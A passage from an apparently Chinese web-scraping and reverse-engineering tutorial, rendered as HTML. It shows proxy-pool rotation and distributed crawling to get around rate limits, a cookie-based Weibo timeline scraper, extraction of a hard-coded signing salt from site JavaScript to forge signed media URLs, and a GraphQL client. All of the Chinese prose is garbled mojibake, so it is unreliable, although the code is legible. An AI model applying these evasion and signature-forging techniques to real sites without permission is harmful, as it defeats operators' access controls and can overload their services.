      <h2 id="æ¡ˆä¾‹å››é™æµä¸åçˆ¬">æ¡ˆä¾‹å››ï¼šé™æµä¸åçˆ¬</h2>

      <h3 id="èƒŒæ™¯-4">èƒŒæ™¯</h3>

      <p>é¢‘ç¹è¯·æ±‚ä¼šè§¦å‘é™æµï¼š</p>

      <ul>
        <li>å• IP æ¯åˆ†é’Ÿæœ€å¤š 60 æ¬¡è¯·æ±‚</li>
        <li>è¶…è¿‡åè¿”å› 429 Too Many Requests</li>
      </ul>

      <hr />

      <h3 id="ç»•è¿‡ç­–ç•¥">ç»•è¿‡ç­–ç•¥</h3>

      <h4 id="1-é™ä½è¯·æ±‚é¢‘ç‡">1. é™ä½è¯·æ±‚é¢‘ç‡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://example.com/api/products?page=</span><span class="si">{</span><span class="n">page</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>

    <span class="c1"># ä¼‘çœ  1-3 ç§’</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span>
</code></pre>
      </div>

      <h4 id="2-ä½¿ç”¨ä»£ç†æ± ">2. ä½¿ç”¨ä»£ç†æ± </h4>

      <div class="codehilite">
        <pre><span></span><code><span class="n">proxies_list</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy1:port&#39;</span><span class="p">},</span>
    <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://proxy2:port&#39;</span><span class="p">},</span>
    <span class="c1"># ...</span>
<span class="p">]</span>

<span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
    <span class="n">proxy</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">proxies_list</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
        <span class="sa">f</span><span class="s1">&#39;https://example.com/api/products?page=</span><span class="si">{</span><span class="n">page</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
        <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span>
    <span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-åˆ†å¸ƒå¼çˆ¬å–">3. åˆ†å¸ƒå¼çˆ¬å–</h4>

      <p>ä½¿ç”¨ Scrapy + Redis å®ç°åˆ†å¸ƒå¼ï¼š</p>

      <ul>
        <li>å¤šå°æœåŠ¡å™¨åŒæ—¶çˆ¬å–</li>
        <li>Redis å­˜å‚¨ä»»åŠ¡é˜Ÿåˆ—å’Œå»é‡</li>
        <li>æ¯å°æœåŠ¡å™¨ç‹¬ç«‹ IP</li>
      </ul>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>ç”µå•†ç½‘ç«™é€†å‘çš„æ ¸å¿ƒæŒ‘æˆ˜ï¼š</p>

      <ol>
        <li><strong>åŠ å¯†ç®—æ³•</strong>: ä»·æ ¼ã€åº“å­˜ç­‰æ•æ„Ÿæ•°æ®åŠ å¯†</li>
        <li><strong>API ç­¾å</strong>: é˜²æ­¢å‚æ•°ç¯¡æ”¹</li>
        <li><strong>éªŒè¯ç </strong>: æ»‘å—ã€ç‚¹é€‰ã€è¡Œä¸ºéªŒè¯</li>
        <li><strong>é™æµ</strong>: IP å°ç¦ã€é¢‘ç‡é™åˆ¶</li>
      </ol>

      <p><strong>åº”å¯¹ç­–ç•¥</strong>:</p>

      <ul>
        <li>é™æ€åˆ†æ + åŠ¨æ€è°ƒè¯•å®šä½åŠ å¯†é€»è¾‘</li>
        <li>Hook å…³é”®å‡½æ•°éªŒè¯ç®—æ³•</li>
        <li>ä½¿ç”¨ä»£ç†æ± ã€é™ä½é¢‘ç‡é¿å…å°ç¦</li>
        <li>Selenium/Puppeteer åº”å¯¹å¤æ‚éªŒè¯ç </li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#03-Basic-Recipes-api-reverse-engineering">API æ¥å£é€†å‘</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#04-Advanced-Recipes-captcha-bypass">éªŒè¯ç è¯†åˆ«ä¸ç»•è¿‡</a></li>
        <li><a href="#06-Engineering-proxy-pool-management">ä»£ç†æ± ç®¡ç†</a></li>
      </ul>

    </div>

    <div class="section" id="05-Case-Studies-case-social-media">
      <h2>46. Social Media</h2>
      <h1 id="ç¤¾äº¤åª’ä½“é€†å‘æ¡ˆä¾‹">ç¤¾äº¤åª’ä½“é€†å‘æ¡ˆä¾‹</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>ç¤¾äº¤åª’ä½“å¹³å°é€šå¸¸åŒ…å«å¤æ‚çš„ API è°ƒç”¨ã€æ— é™æ»šåŠ¨åŠ è½½ã€å®æ—¶é€šä¿¡ã€å†…å®¹æ¨èç®—æ³•ç­‰ã€‚æœ¬æ–‡é€šè¿‡çœŸå®æ¡ˆä¾‹ä»‹ç»ç¤¾äº¤åª’ä½“å¹³å°çš„é€†å‘åˆ†ææŠ€å·§ã€‚</p>

      <hr />

      <h2 id="æ¡ˆä¾‹ä¸€å¾®åštwitter-æ— é™æ»šåŠ¨åˆ†é¡µ">æ¡ˆä¾‹ä¸€ï¼šå¾®åš/Twitter æ— é™æ»šåŠ¨åˆ†é¡µ</h2>

      <h3 id="èƒŒæ™¯">èƒŒæ™¯</h3>

      <p>ç¤¾äº¤åª’ä½“çš„ä¿¡æ¯æµé€šå¸¸é‡‡ç”¨æ— é™æ»šåŠ¨ï¼ˆInfinite Scrollï¼‰æ–¹å¼åŠ è½½ï¼š</p>

      <ul>
        <li>ç”¨æˆ·æ»šåŠ¨åˆ°åº•éƒ¨æ—¶è‡ªåŠ¨åŠ è½½ä¸‹ä¸€é¡µ</li>
        <li>ä¸ä½¿ç”¨ä¼ ç»Ÿçš„ <code>page=1,2,3</code> åˆ†é¡µ</li>
        <li>ä½¿ç”¨æ¸¸æ ‡ï¼ˆcursorï¼‰æˆ–æœ€åä¸€æ¡ ID ä½œä¸ºåˆ†é¡µæ ‡è¯†</li>
      </ul>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-æŠ“åŒ…åˆ†æ">1. æŠ“åŒ…åˆ†æ</h4>

      <p>æ»šåŠ¨åˆ°åº•éƒ¨ï¼Œè§‚å¯Ÿ Network é¢æ¿çš„ XHR è¯·æ±‚ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">GET</span> <span class="nn">/api/timeline?max_id=1234567890&amp;count=20</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre>
      </div>

      <p>å‚æ•°è¯´æ˜ï¼š</p>

      <ul>
        <li><code>max_id</code>: å½“å‰é¡µæœ€åä¸€æ¡å¾®åšçš„ ID</li>
        <li><code>count</code>: æ¯é¡µæ•°é‡</li>
      </ul>

      <p>å“åº”ç»“æ„ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1234567890&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;text&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;å¾®åšå†…å®¹...&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;user&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="err">...</span><span class="p">},</span>
<span class="w">            </span><span class="nt">&quot;created_at&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2023-12-17 10:00:00&quot;</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="c1">// æ›´å¤šå¾®åš...</span>
<span class="w">    </span><span class="p">],</span>
<span class="w">    </span><span class="nt">&quot;next_cursor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1234567850&quot;</span><span class="w">  </span><span class="c1">// ä¸‹ä¸€é¡µçš„ cursor</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-python-å®ç°çˆ¬å–">2. Python å®ç°çˆ¬å–</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">WeiboScraper</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cookie</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0...&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
            <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://weibo.com/&#39;</span>
        <span class="p">})</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="o">=</span> <span class="s1">&#39;https://weibo.com/api/timeline&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">fetch_timeline</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">max_id</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">20</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æ—¶é—´çº¿&quot;&quot;&quot;</span>
        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;count&#39;</span><span class="p">:</span> <span class="n">count</span><span class="p">}</span>
        <span class="k">if</span> <span class="n">max_id</span><span class="p">:</span>
            <span class="n">params</span><span class="p">[</span><span class="s1">&#39;max_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">max_id</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">scrape_all</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">max_pages</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;çˆ¬å–å¤šé¡µ&quot;&quot;&quot;</span>
        <span class="n">all_posts</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">next_cursor</span> <span class="o">=</span> <span class="kc">None</span>

        <span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">max_pages</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Fetching page </span><span class="si">{</span><span class="n">page</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="si">}</span><span class="s1">...&#39;</span><span class="p">)</span>

            <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">fetch_timeline</span><span class="p">(</span><span class="n">max_id</span><span class="o">=</span><span class="n">next_cursor</span><span class="p">)</span>

            <span class="n">posts</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="p">[])</span>
            <span class="n">all_posts</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">posts</span><span class="p">)</span>

            <span class="c1"># è·å–ä¸‹ä¸€é¡µæ¸¸æ ‡</span>
            <span class="n">next_cursor</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;next_cursor&#39;</span><span class="p">)</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">next_cursor</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;No more data&#39;</span><span class="p">)</span>
                <span class="k">break</span>

            <span class="c1"># ç¤¼è²Œå»¶è¿Ÿ</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">all_posts</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">scraper</span> <span class="o">=</span> <span class="n">WeiboScraper</span><span class="p">(</span><span class="n">cookie</span><span class="o">=</span><span class="s1">&#39;YOUR_COOKIE_HERE&#39;</span><span class="p">)</span>
<span class="n">posts</span> <span class="o">=</span> <span class="n">scraper</span><span class="o">.</span><span class="n">scrape_all</span><span class="p">(</span><span class="n">max_pages</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>

<span class="k">for</span> <span class="n">post</span> <span class="ow">in</span> <span class="n">posts</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[</span><span class="si">{</span><span class="n">post</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">post</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹äºŒinstagramæŠ–éŸ³å›¾ç‰‡è§†é¢‘-url-è§£å¯†">æ¡ˆä¾‹äºŒï¼šInstagram/æŠ–éŸ³å›¾ç‰‡/è§†é¢‘ URL è§£å¯†</h2>

      <h3 id="èƒŒæ™¯-2">èƒŒæ™¯</h3>

      <p>ç¤¾äº¤åª’ä½“å¹³å°çš„å›¾ç‰‡/è§†é¢‘ URL é€šå¸¸ç»è¿‡åŠ å¯†æˆ–ç­¾åï¼š</p>

      <ul>
        <li>é˜²æ­¢ç›´æ¥ä¸‹è½½</li>
        <li>é˜²æ­¢ç›—é“¾</li>
        <li>æ·»åŠ æ—¶æ•ˆæ€§ï¼ˆURL åœ¨ä¸€å®šæ—¶é—´åå¤±æ•ˆï¼‰</li>
      </ul>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤-2">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-è§‚å¯Ÿå›¾ç‰‡åŠ è½½">1. è§‚å¯Ÿå›¾ç‰‡åŠ è½½</h4>

      <p>åœ¨ Network é¢æ¿ä¸­è§‚å¯Ÿå›¾ç‰‡è¯·æ±‚ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">GET</span> <span class="nn">/img/v2/abc123?sig=def456&amp;ts=1702800000</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre>
      </div>

      <p>å‚æ•°ï¼š</p>

      <ul>
        <li><code>sig</code>: ç­¾å</li>
        <li><code>ts</code>: æ—¶é—´æˆ³</li>
      </ul>

      <h4 id="2-å®šä½ç­¾åç”Ÿæˆå‡½æ•°">2. å®šä½ç­¾åç”Ÿæˆå‡½æ•°</h4>

      <p>åœ¨ Sources é¢æ¿æœç´¢ <code>sig</code> æˆ– <code>signature</code>ï¼Œæ‰¾åˆ°ç”Ÿæˆé€»è¾‘ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">generateImageSignature</span><span class="p">(</span><span class="nx">imageId</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ‹¼æ¥å­—ç¬¦ä¸²</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">imageId</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nx">SECRET_SALT</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// MD5 ç­¾å</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">imageId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;abc123&#39;</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">sig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generateImageSignature</span><span class="p">(</span><span class="nx">imageId</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">imageUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`/img/v2/</span><span class="si">${</span><span class="nx">imageId</span><span class="si">}</span><span class="sb">?sig=</span><span class="si">${</span><span class="nx">sig</span><span class="si">}</span><span class="sb">&amp;ts=</span><span class="si">${</span><span class="nx">timestamp</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
</code></pre>
      </div>

      <p><strong>å¯†é’¥æå–</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æœç´¢ &quot;SECRET_SALT&quot; æˆ–ç¡¬ç¼–ç çš„å­—ç¬¦ä¸²</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">SECRET_SALT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;my_secret_key_2023&quot;</span><span class="p">;</span>
</code></pre>
      </div>

      <h4 id="3-python-å®ç°">3. Python å®ç°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MediaDownloader</span><span class="p">:</span>
    <span class="n">SECRET_SALT</span> <span class="o">=</span> <span class="s2">&quot;my_secret_key_2023&quot;</span>  <span class="c1"># ä» JS ä¸­æå–</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">generate_signature</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">media_id</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆç­¾å&quot;&quot;&quot;</span>
        <span class="n">str_to_sign</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">media_id</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">SECRET_SALT</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">str_to_sign</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_media_url</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">media_id</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆæœ‰ç­¾åçš„åª’ä½“ URL&quot;&quot;&quot;</span>
        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
        <span class="n">sig</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_signature</span><span class="p">(</span><span class="n">media_id</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">)</span>

        <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;https://example.com/img/v2/</span><span class="si">{</span><span class="n">media_id</span><span class="si">}</span><span class="s2">?sig=</span><span class="si">{</span><span class="n">sig</span><span class="si">}</span><span class="s2">&amp;ts=</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">download</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">media_id</span><span class="p">,</span> <span class="n">save_path</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸‹è½½åª’ä½“&quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_media_url</span><span class="p">(</span><span class="n">media_id</span><span class="p">)</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">save_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Downloaded to </span><span class="si">{</span><span class="n">save_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">downloader</span> <span class="o">=</span> <span class="n">MediaDownloader</span><span class="p">()</span>
<span class="n">downloader</span><span class="o">.</span><span class="n">download</span><span class="p">(</span><span class="s1">&#39;abc123&#39;</span><span class="p">,</span> <span class="s1">&#39;image.jpg&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹ä¸‰graphql-api-é€†å‘">æ¡ˆä¾‹ä¸‰ï¼šGraphQL API é€†å‘</h2>

      <h3 id="èƒŒæ™¯-3">èƒŒæ™¯</h3>

      <p>ç°ä»£ç¤¾äº¤åª’ä½“ï¼ˆå¦‚ Facebook, Instagram, GitHubï¼‰ä½¿ç”¨ GraphQL è€Œé REST APIï¼š</p>

      <ul>
        <li>å•ä¸ªç«¯ç‚¹å¤„ç†æ‰€æœ‰è¯·æ±‚</li>
        <li>å®¢æˆ·ç«¯æŒ‡å®šéœ€è¦çš„å­—æ®µ</li>
        <li>å¤æ‚çš„æŸ¥è¯¢ç»“æ„</li>
      </ul>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤-3">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-æŠ“åŒ…åˆ†æ-graphql-è¯·æ±‚">1. æŠ“åŒ…åˆ†æ GraphQL è¯·æ±‚</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">POST</span> <span class="nn">/graphql</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>

<span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;query&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;query UserTimeline($userId: ID!, $first: Int!) { user(id: $userId) { posts(first: $first) { edges { node { id text created_at likes { count } } } } } }&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;variables&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;userId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;12345&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;first&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-ç†è§£æŸ¥è¯¢ç»“æ„">2. ç†è§£æŸ¥è¯¢ç»“æ„</h4>

      <p>æŸ¥è¯¢æ ¼å¼åŒ–åï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">query</span><span class="w"> </span><span class="nf">UserTimeline</span><span class="p">(</span><span class="nv">$userId</span><span class="p">:</span><span class="w"> </span><span class="nb">ID</span><span class="p">!,</span><span class="w"> </span><span class="nv">$first</span><span class="p">:</span><span class="w"> </span><span class="nb">Int</span><span class="p">!)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">user</span><span class="p">(</span><span class="n">id</span><span class="p">:</span><span class="w"> </span><span class="nv">$userId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">posts</span><span class="p">(</span><span class="n">first</span><span class="p">:</span><span class="w"> </span><span class="nv">$first</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">edges</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">node</span><span class="w"> </span><span class="p">{</span>
<span class="w">          </span><span class="n">id</span>
<span class="w">          </span><span class="n">text</span>
<span class="w">          </span><span class="n">created_at</span>
<span class="w">          </span><span class="n">likes</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">count</span>
<span class="w">          </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="3-python-å®ç°-2">3. Python å®ç°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">class</span><span class="w"> </span><span class="nc">GraphQLClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">endpoint</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">endpoint</span> <span class="o">=</span> <span class="n">endpoint</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>
        <span class="p">}</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">query</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query_string</span><span class="p">,</span> <span class="n">variables</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ‰§è¡Œ GraphQL æŸ¥è¯¢&quot;&quot;&quot;</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;query&#39;</span><span class="p">:</span> <span class="n">query_string</span><span class="p">}</span>
        <span class="k">if</span> <span class="n">variables</span><span class="p">:</span>
            <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;variables&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">variables</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
            <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span>
            <span class="n">headers</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span>
        <span class="p">)</span>

        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

